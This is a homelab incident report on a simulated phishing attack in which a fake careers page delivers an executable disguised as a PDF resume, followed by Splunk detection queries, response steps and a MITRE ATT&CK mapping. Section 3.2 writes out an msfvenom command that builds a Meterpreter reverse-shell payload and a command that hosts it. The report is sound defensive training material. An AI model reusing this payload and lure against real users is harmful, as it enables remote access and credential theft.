# Incident Report – Malicious Resume Phishing Simulation

## 1. Overview

- **Incident Type:** Phishing → Malicious attachment → C2 communication  
- **Environment:** VirtualBox homelab (Windows 10 victim, Kali Linux attacker, Splunk SIEM, Sysmon logging)  
- **Objective:** Simulate a realistic phishing-driven compromise and demonstrate detection using Splunk.

---

## 2. Lab Environment

- **Victim:** Windows 10 VM  
  - IP: `192.168.56.10` (Internal Network)  
  - Logging: Sysmon → Windows Event Logs → Splunk index `endpoint`  
- **Attacker:** Kali Linux VM  
  - IP: `192.168.56.11` (same Internal Network `intnet`)  
  - Tools: `msfvenom`, `python3 -m http.server`, `nmap`  
- **Network:** VirtualBox “Internal Network” named `intnet` with both VMs connected.

---

## 3. Attack Scenario

### 3.1 Phishing lure

- A fake “Careers – Application Portal” page was hosted on Kali at `http://192.168.56.11:8888`.  
- The page instructed the user to download a “candidate resume (PDF)”, which actually delivered a Windows executable.

### 3.2 Payload creation and hosting

On Kali:
**Generate malicious payload**

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.11 LPORT=4444 -f exe -o resume.pdf.exe`

**Host phishing page and payload**

`python3 -m http.server 8888`


- The generated file `resume.pdf.exe` was placed in the web server directory and served over port `8888`.  
- `nmap` was used to discover the victim (`192.168.56.10`) before launching the scenario.

### 3.3 Victim interaction

On Windows 10:

1. User browsed to `http://192.168.56.11:8888`.  
2. Clicked the “Download candidate resume (PDF)” link.  
3. File `resume.pdf.exe` was downloaded to `C:\Users\<User>\Downloads\`.  
4. User executed the file from the Downloads folder.

---

## 4. Evidence Collected (Screenshots)

Use these points as captions for the uploaded images in your repo:

- **Network configuration:** VirtualBox `intnet` adapter for Kali and Windows (internal-only lab network).  
- **Host discovery:** `nmap` output showing Windows host `192.168.56.10`.  
- **Kali IP configuration:** `ip a` output showing `192.168.56.11/24`.  
- **Victim IP configuration:** `ipconfig` on Windows showing `192.168.56.10`.  
- **Phishing page:** Fake careers / application portal with resume download link.  
- **Payload download:** Browser download of `resume.pdf.exe` into the Downloads folder.  
- **Payload execution:** Evidence of the file present and executed on the victim.  
- **C2 and HTTP logs:** Kali terminal showing HTTP server access to `/resume.pdf.exe` from `192.168.56.10`.  
- **Connectivity tests:** Ping from Windows → Kali and Kali → Windows to confirm network reachability.  
- **Splunk ingestion check:** Search showing `index=endpoint` events and Sysmon sourcetype counts.  

---

## 5. Splunk Detection and Analysis

### 5.1 Data sources

- Index: `endpoint`  
- Sourcetypes:
  - `WinEventLog:Microsoft-Windows-Sysmon/Operational`
  - `WinEventLog:Security`
  - `WinEventLog:System`
  - `WinEventLog:Application`

### 5.2 Key detection searches

#### a) Suspicious resume executable executed
```
index=endpoint earliest=-7d
| search "resume.pdf.exe"
| table _time host source sourcetype Image TargetFilename User ComputerName
| sort _time
```

**Findings:**

- Sysmon logs show `resume.pdf.exe` associated with Microsoft Edge as the process that downloaded the file and wrote it to `C:\Users\<User>\Downloads\resume.pdf.exe:Zone.Identifier`.  
- Events show the referrer `http://192.168.56.11:8888/` indicating the malicious web server.

#### b) Executables run from user Downloads/Desktop
```
index=endpoint earliest=-7d
| search Image="\Users\\Downloads\.exe" OR Image="\Users\\Desktop\.exe"
| table _time host Image CommandLine User ComputerName
| sort _time
```


**Findings:**

- Identifies any executables launched from common user folders, including the simulated payload.

#### c) Victim ↔ Attacker network activity (C2 / staging)
```
index=endpoint earliest=-7d
| search "192.168.56.10" OR "192.168.56.11"
| table _time host source dest dest_port Image
| sort _time
```

**Findings:**

- Shows HTTP traffic from Windows (`192.168.56.10`) to Kali (`192.168.56.11`) over `8888` for payload download.  
- Shows further connections toward attacker IP, which could be tied to the future Meterpreter handler on port `4444` in a real engagement.

#### d) Ingestion / sourcetype health check
```
index=endpoint
| stats count by sourcetype
```


**Findings:**

- Confirms Sysmon and Windows Event Logs are being collected correctly and used for detection.

---

## 6. Attack Timeline (UTC)

- **T0:** Kali enumerates victim `192.168.56.10` (nmap).  
- **T1:** Kali starts HTTP server on port `8888` and hosts phishing page + payload.  
- **T2:** Victim visits fake careers page and downloads `resume.pdf.exe`.  
- **T3:** `resume.pdf.exe` written to `C:\Users\<User>\Downloads\` (logged by Sysmon).  
- **T4:** User executes `resume.pdf.exe`, establishing the initial run of the malicious binary.  
- **T5:** Network traffic observed between `192.168.56.10` and `192.168.56.11` associated with attack activity.

---

## 7. Impact Assessment

- **Confidentiality:** High – payload designed to open a reverse shell, allowing access to files and credentials.  
- **Integrity:** Medium – attacker could modify or drop additional tools once shell is established.  
- **Availability:** Low – scenario focused on stealthy access, not disruption.

---

## 8. Incident Response Actions

### 8.1 Immediate actions

- Isolate the affected Windows host from the network.  
- Terminate any suspicious processes related to `resume.pdf.exe`.  
- Block attacker IP `192.168.56.11` and associated ports (e.g., `8888`, `4444`) at relevant controls.

### 8.2 Short‑term actions

- Collect forensic artifacts: memory dump, disk image, and full event logs from the victim.  
- Search across environment for other hosts downloading or executing `resume.pdf.exe`.  
- Add Splunk correlation searches/alerts using the detection queries above.

### 8.3 Long‑term improvements

- Implement attachment sandboxing and file-type validation for resumes and other uploads.  
- Enforce hiding of known file extensions and train users not to trust “.pdf.exe” style files.  
- Expand Sysmon configuration to capture detailed process, network, and file creation events.  
- Regularly test detections with similar simulated phishing scenarios.

---

## 9. MITRE ATT&CK Mapping

| Tactic              | Technique                                        | Example in Lab                                      |
|---------------------|--------------------------------------------------|-----------------------------------------------------|
| Initial Access      | T1566.002 – Phishing: Malicious Attachment       | Fake careers page delivering `resume.pdf.exe`       |
| Execution           | T1204.002 – User Execution: Malicious File       | User runs file from Downloads                       |
| Command & Control   | T1071.001 – Web Protocols                        | HTTP communication to `192.168.56.11:8888`          |
| Discovery           | T1046 – Network Service Scanning                 | `nmap` scan from Kali to `192.168.56.10`            |
| Defense Evasion     | T1036 – Masquerading                             | Payload named to look like a PDF resume             |

---

## 10. Lessons Learned

- Users can be tricked by realistic application portals and resume downloads.  
- Sysmon plus Splunk provides strong visibility into process and network activity.  
- Simple, focused SPL detections (malicious filename, Downloads execution, attacker IP) are effective for early-stage detection in similar phishing-to-C2 attacks.







